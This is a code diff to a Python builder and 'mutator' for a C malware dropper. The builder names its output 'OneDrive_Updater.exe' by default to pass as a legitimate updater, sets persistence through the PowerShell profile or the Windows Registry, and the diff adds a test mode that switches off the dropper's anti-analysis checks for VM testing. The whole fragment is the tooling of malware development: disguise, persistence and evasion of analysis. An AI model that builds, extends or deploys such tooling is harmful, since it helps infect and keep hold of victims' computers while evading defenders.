@@ -16,6 +16,7 @@ parser = argparse.ArgumentParser(description="Builder and Mutator for the C Drop
 parser.add_argument("--name", type=str, default="OneDrive_Updater.exe", help="Name of the final generated executable")
 parser.add_argument("--debug", action="store_true", help="Compile in debug mode (shows the terminal window)")
 parser.add_argument("--persistence", type=str, choices=["ps", "reg"], default="reg", help="Select persistence method: PowerShell Profile (ps) or Windows Registry (reg)")
+parser.add_argument("--test", action="store_true", help="Bypass anti-analysis checks for testing in a VM")
 args = parser.parse_args()
 
 print("[*] 1. Compiling C code...")
@@ -54,6 +55,11 @@ if not args.debug:
 else:
     print("[!] DEBUG MODE activated: The terminal window will be visible.")
     compile_cmd.append("-DDEBUG")
+
+# if --test flag, GCC defines TEST_MODE
+if args.test:
+    print("[!] TEST MODE activated: Anti-analysis features will be bypassed in compilation.")
+    compile_cmd.append("-DTEST_MODE")
 
 subprocess.run(compile_cmd, check=True)
 base_hash = get_sha256(compiled_exe)
